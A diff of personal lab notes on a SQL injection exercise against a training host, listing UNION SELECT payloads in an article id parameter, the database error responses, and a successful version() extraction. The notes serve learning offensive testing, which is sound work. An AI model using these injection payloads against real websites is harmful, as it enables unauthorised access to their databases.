@@ -37,14 +37,17 @@ http://sqli.naham.sec:8081/article?id=-2%20union%20select%201,2,3,4;--  (-2 unio
 ![[Screenshot From 2025-03-04 15-04-31.png]]
 so using id= -2  we were able to create another article that didn't exist earlier 
 
+
 http://sqli.naham.sec:8081/article?id=-2%20union%20select%201,2,3,4%20from%20article;--  ( -2 union select 1,2,3,4 from article;-- )
+response - 
+
+http://sqli.naham.sec:8081/article?id=-2%20union%20select%201,2,3,4%20from%20id;--  ( -2 union select 1,2,3,4 from id;-- )
+response -   Table 'nahamsec.id' doesn't exist
 
 
 
 
-
-
-http://sqli.naham.sec:8081/article?id=-2%20union%20select%201,2,id,4;--   (-2 union select 1,2,id,4;--    result: Unknown column 'id' in 'field list')
+http://sqli.naham.sec:8081/article?id=-2%20union%20select%201,2,id,4;--   (-2 union select 1,2,id,4;--    response: Unknown column 'id' in 'field list')
 
 
 http://sqli.naham.sec:8081/article?id=-2%20union%20select%201,2,version(),4;--  ( -2 union select 1,2,version(),4;-- )    hence for this the sqli worked and we were able to retrieve data.
